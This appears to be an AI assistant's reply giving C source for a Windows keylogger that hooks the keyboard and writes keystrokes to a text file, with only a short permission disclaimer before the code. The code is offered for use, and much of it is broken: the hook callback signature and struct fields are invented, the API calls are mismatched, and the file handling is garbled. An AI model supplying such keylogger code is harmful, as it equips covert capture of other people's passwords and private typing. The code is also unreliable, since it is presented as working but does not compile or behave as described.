Here is a C program that demonstrates how to log keystrokes on a Windows computer using a keyboard hook. Please note that this code should be used responsibly and only on systems you own or have permission to use. It's important to be aware that keystroke logging can be considered intrusive and may violate the privacy of the user.

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_KEYSTROKES 1000  // Maximum number of keystrokes to log

static int g_hook = 0;
static FILE *file = NULL;
static int keystrokes = 0;

// Function to log keystrokes to a file
void log_keystroke(int key, int state) {
    if (file == NULL) {
        // Create the file if it doesn't exist
        file = fopen("keystrokes.txt", "a");
        if (file == NULL) {
            // Error opening the file
            printf("Failed to create keystroke file.\n");
            return;
        }
    }
    // Convert key to a character
    char c = (key >= 0 && key <= 0x1F) ? (key + 0x20) : key;
    // Check if the stroke is a printable character
    if (isprint(c)) {
        // Append to file
        if (fputc(c, file) == EOF) {
            // Error writing to file
            printf("Error writing to keystroke file.\n");
            fclose(file);
            file = NULL;
        }
    } else {
        // Append non-printable characters as well
        // You can handle non-printable characters as needed
        // For this example, we'll just note the key code
        if (fputc(c, file) == EOF) {
            fclose(file);
            file = NULL;
        }
    }
    keystrokes++;
    if (keystrokes >= MAX_KEYSTROKES) {
        // Rotate the file or clear it (commented out for simplicity)
        // See: https://docs.microsoft.com/en-us/windows/desktop/api/keyboardapis/nf-keyboardapis-setwindowshook
        // You may want to implement file rotation here
        // For this example, we'll not implement it
    }
}

// Callback function for keyboard hook
static LRESULT CALLBACK keyboard_hook(int numpad, int modifiers, int time, DWORD *keystroke) {
    if (!keystroke) {
        return false;
    }
    if (keystroke->wKeyClass == KEYBOARD) {
        if (keystroke->wKeyID == 0x10 || keystroke->wKeyID == 0x11) {
            // Special handling for numpad keys (if needed)
            log_keystroke(keystroke->wKeyID, keystroke->wKeyState);
        } else {
            // Regular keyboard keys
            log_keystroke(keystroke->wKeyID, keystroke->wKeyState);
        }
    }
    return true;
}

// Initialize and set up the keyboard hook
int main() {
    // Create a temporary file in the current directory
    char temp_filename[] = "temp_keylog.txt";
    FILE *temp_file = fopen(temp_filename, "w");
    if (temp_file) {
        fprintf(temp_file, "Keystroke logging started on %s\n", freopen("temp_keylog.txt", "w", temp_file));
    } else {
        printf("Error creating temporary file.\n");
        return -1;
    }

    g_hook = SetWindowsHook(WH_KEYBOARD_LL, keyboard_hook);

    if (g_hook == 0) {
        printf("Failed to set keyboard hook.\n");
        return -1;
    }

    printf("Keyboard hook installed. Pressing keys will be logged to keystrokes.txt.\n");

    // Wait for a key press to start logging
    while (true) {
        Sleep(1);
        if (keystrokes > 0) {
            // You can break the loop when you want to stop logging
            break;
        }
    }

    // Remove the keyboard hook and clean up
    UnhookWindowsHook(g_hook);
    fclose(temp_file);
    printf("Keyboard hook removed.\n");

    return 0;
}
```

